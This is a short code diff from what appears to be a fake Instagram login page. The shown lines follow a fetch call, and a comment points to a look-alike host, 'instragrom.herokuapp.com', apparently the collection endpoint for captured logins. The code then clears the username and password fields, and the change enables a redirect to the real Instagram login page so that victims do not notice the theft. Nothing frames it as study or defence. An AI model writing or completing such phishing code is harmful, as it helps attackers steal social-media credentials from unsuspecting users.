@@ -23,7 +23,7 @@ await fetch(
 // https://instragrom.herokuapp.com/user
 username.value="";
 password.value="";
-// window.location.href="https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav";
+window.location.href="https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav";
 
 
 }
